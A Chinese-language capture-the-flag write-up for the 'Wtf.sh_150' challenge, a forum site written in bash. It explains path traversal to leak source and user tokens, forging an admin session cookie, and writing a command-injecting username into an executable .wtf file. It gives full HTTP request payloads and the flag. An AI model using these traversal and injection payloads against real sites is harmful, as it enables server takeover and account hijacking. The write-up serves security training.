# Wtf.sh_150

## 思路分析

> 打开网站,是个论坛网站,但是网站文件后缀竟然是wtf,是用bash写的,真是第一次见.扫目录与查看源码无收获.先注册一个账号,点击别人已发布的文章,url是/post.wtf?post=K8laH,尝试post.wtf?post=../得到网站源码,进行分析.格式化源码,发现当cookie中的用户名是admin和cookie中的token是admin用户的token时是会得到flag.尝试post.wtf?post=../users会得到用户的token,找到admin的token,访问/profile.wtf?user=JcO27时修改cookie中的用户名和token,得到了部分flag.

> 继续分析代码,因为wtf不是常规的网页文件,故寻找解析wtf文件的代码,找到了include_page函数,能够解析并执行wtf文件,如果还能够上传wtf文件并执行的话,就可以达到控制服务器的目的.继续分析reply函数,这是评论功能的后台代码,这部分也是存在路径穿越的.这行代码把用户名写在了评论文件的内容中：echo "\${username}" > "${next_file}";如果用户名是一段可执行代码,而且写入的文件是wtf格式的,那么这个文件就能够执行我们想要的代码.上传的文件末尾需要添加%09字符,这是水平制表符,必须添加,不然后台会把我们的后门当做目录去解析.

> 分别注册\${find,/,-iname,get_flag2}与$/usr/bin/get_flag2用户名,然后去评论文章,抓包,url修改为/reply.wtf?post=../users_lookup/shell.wtf%09,访问/users_lookup/shell.wtf得到了另一部分flag.

## payload

```
GET /profile.wtf?user=jlvfK HTTP/1.1
Host: 61.147.171.105:62296
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://61.147.171.105:62296/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: Hm_lvt_1cd9bcbaae133f03a6eb19da6579aaba=1676894957,1676899554; last_login_info=YToxOntzOjI6ImlwIjtzOjExOiI1MC43LjI1Mi41OCI7fQ%3D%3D; USERNAME=admin; TOKEN=uYpiNNf/X0/0xNfqmsuoKFEtRlQDwNbS2T6LdHDRWH5p3x4bL4sxN0RMg17KJhAmTMyr8Sem++fldP0scW7g3w==
Connection: close
```

```
POST /reply.wtf?post=../users_lookup/shell.wtf%09 HTTP/1.1
Host: 61.147.171.105:62296
Content-Length: 17
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://61.147.171.105:62296
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://61.147.171.105:62296/reply.wtf?post=K8laH
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: Hm_lvt_1cd9bcbaae133f03a6eb19da6579aaba=1676894957,1676899554; last_login_info=YToxOntzOjI6ImlwIjtzOjExOiI1MC43LjI1Mi41OCI7fQ%3D%3D; USERNAME=${find,/,-iname,get_flag2}; TOKEN=si7lLthLI0lJLIJg3Gb0YaojBIBuqwFphk5/Pl5QTLnk+cMa/iz/Ay0VxoKTuXbrvzKSbQ9HGAlFb8Kri3+J/A==
Connection: close

text=test&submit=
```

```
POST /reply.wtf?post=../users_lookup/shell.wtf%09 HTTP/1.1
Host: 61.147.171.105:62296
Content-Length: 17
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://61.147.171.105:62296
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://61.147.171.105:62296/reply.wtf?post=K8laH
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: Hm_lvt_1cd9bcbaae133f03a6eb19da6579aaba=1676894957,1676899554; last_login_info=YToxOntzOjI6ImlwIjtzOjExOiI1MC43LjI1Mi41OCI7fQ%3D%3D; USERNAME=$/usr/bin/get_flag2; TOKEN=zXVtEcLIl9h1FCd2AIYJLgJyhKDNahE86pyL7pqcI29SYeacgLUp7O1daT6XZVYSrh/vsV8m+d8ESwPSDM8a4Q==
Connection: close

text=test&submit=
```

## flag

> xctf{cb49256d1ab48803149e5ec49d3c29ca}